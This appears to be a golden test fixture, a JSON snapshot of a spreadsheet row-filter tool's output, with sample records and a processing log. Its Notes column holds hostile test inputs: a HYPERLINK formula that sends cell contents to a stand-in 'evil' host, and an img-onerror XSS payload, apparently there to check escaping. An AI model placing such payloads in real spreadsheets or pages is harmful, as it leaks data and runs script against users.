@@ -1,0 +1,211 @@
+{
+ "json": {
+  "matching_rows": 9,
+  "original_rows": 40,
+  "sheet_names": [
+   "Main",
+   "Second"
+  ],
+  "success": true,
+  "warning": "golden.xlsx has 2 sheets (Main, Second); only the first sheet, 'Main', was processed."
+ },
+ "output": {
+  "Sheet1": [
+   [
+    "s:'ID'",
+    "s:'Zip'",
+    "s:'Account'",
+    "s:'BigId'",
+    "s:'Amount'",
+    "s:'Region'",
+    "s:'Date'",
+    "s:'DateText'",
+    "s:'EuroNum'",
+    "s:'Pct'",
+    "s:'Flag'",
+    "s:'Name'",
+    "s:'Email'",
+    "s:'Notes'"
+   ],
+   [
+    "s:'PR-00014'",
+    "s:'01091'",
+    "n:1013",
+    "s:'9007199254741006'",
+    "n:187.5",
+    "s:'S'",
+    "d:'2024-01-14T00:00:00'",
+    "s:'2024-03-05'",
+    "s:'1.234,56'",
+    "n:0.5",
+    "b:False",
+    "s:'Bob'",
+    "s:'bob13@example.com'",
+    "s:'x|||y'"
+   ],
+   [
+    "s:'PR-00017'",
+    "s:'01112'",
+    "n:1016",
+    "s:'9007199254741009'",
+    "n:300",
+    "s:'S'",
+    "d:'2024-01-17T00:00:00'",
+    "s:'2024-03-05'",
+    "s:'1.234,56'",
+    "n:0.5",
+    "b:True",
+    "s:'Alice'",
+    "s:'alice16@example.com'",
+    "s:'=HYPERLINK(\"http://evil/?\"&A2,\"x\")'"
+   ],
+   [
+    "s:'PR-00020'",
+    "s:'01133'",
+    "n:1019",
+    "s:'9007199254741012'",
+    "n:412.5",
+    "s:'S'",
+    "d:'2024-01-20T00:00:00'",
+    "s:'2024-03-05'",
+    "s:'1.234,56'",
+    "n:0.5",
+    "b:False",
+    "s:'Dave'",
+    "s:'dave19@example.com'",
+    "s:'café'"
+   ],
+   [
+    "s:'PR-00023'",
+    "s:'01154'",
+    "n:1022",
+    "s:'9007199254741015'",
+    "n:525",
+    "s:'S'",
+    "d:'2024-01-23T00:00:00'",
+    "s:'2024-03-05'",
+    "s:'1.234,56'",
+    "n:0.5",
+    "b:True",
+    "s:'Carol'",
+    "s:'carol22@example.com'",
+    "s:'<img src=x onerror=alert(1)>'"
+   ],
+   [
+    "s:'PR-00026'",
+    "s:'01175'",
+    "n:1025",
+    "s:'9007199254741018'",
+    "n:637.5",
+    "s:'S'",
+    "d:'2024-01-26T00:00:00'",
+    "s:'2024-03-05'",
+    "s:'1.234,56'",
+    "n:0.5",
+    "b:False",
+    "s:'Bob'",
+    "s:'bob25@example.com'",
+    "s:'x|||y'"
+   ],
+   [
+    "s:'PR-00029'",
+    "s:'01196'",
+    "n:1028",
+    "s:'9007199254741021'",
+    "n:750",
+    "s:'S'",
+    "d:'2024-01-29T00:00:00'",
+    "s:'2024-03-05'",
+    "s:'1.234,56'",
+    "n:0.5",
+    "b:True",
+    "s:'Alice'",
+    "s:'alice28@example.com'",
+    "s:'=HYPERLINK(\"http://evil/?\"&A2,\"x\")'"
+   ],
+   [
+    "s:'PR-00032'",
+    "s:'01217'",
+    "n:1031",
+    "s:'9007199254741024'",
+    "n:862.5",
+    "s:'S'",
+    "d:'2024-02-01T00:00:00'",
+    "s:'2024-03-05'",
+    "s:'1.234,56'",
+    "n:0.5",
+    "b:False",
+    "s:'Dave'",
+    "s:'dave31@example.com'",
+    "s:'café'"
+   ],
+   [
+    "s:'PR-00035'",
+    "s:'01238'",
+    "n:1034",
+    "s:'9007199254741027'",
+    "n:975",
+    "s:'S'",
+    "d:'2024-02-04T00:00:00'",
+    "s:'2024-03-05'",
+    "s:'1.234,56'",
+    "n:0.5",
+    "b:True",
+    "s:'Carol'",
+    "s:'carol34@example.com'",
+    "s:'<img src=x onerror=alert(1)>'"
+   ],
+   [
+    "s:'PR-00038'",
+    "s:'01259'",
+    "n:1037",
+    "s:'9007199254741030'",
+    "n:1087.5",
+    "s:'S'",
+    "d:'2024-02-07T00:00:00'",
+    "s:'2024-03-05'",
+    "s:'1.234,56'",
+    "n:0.5",
+    "b:False",
+    "s:'Bob'",
+    "s:'bob37@example.com'",
+    "s:'x|||y'"
+   ]
+  ],
+  "_DataDragon_Log": [
+   [
+    "s:'Item'",
+    "s:'Value'"
+   ],
+   [
+    "s:'Tool'",
+    "s:'Row Filter'"
+   ],
+   [
+    "s:'Version'",
+    "s:'<VERSION>'"
+   ],
+   [
+    "s:'Timestamp (UTC)'",
+    "s:'<TIMESTAMP>'"
+   ],
+   [
+    "s:'Rows in'",
+    "s:'40'"
+   ],
+   [
+    "s:'Rows out'",
+    "s:'9'"
+   ],
+   [
+    "s:'Parameters'",
+    "s:'{\"conditions\": [{\"column\": \"Amount\", \"operator\": \"greater_than\"}, {\"column\": \"Region\", \"logic\": \"AND\", \"operator\": \"equals\"}]}'"
+   ],
+   [
+    "s:'Warnings'",
+    "s:\"golden.xlsx has 2 sheets (Main, Second); only the first sheet, 'Main', was processed.\""
+   ]
+  ]
+ },
+ "status": 200
+}
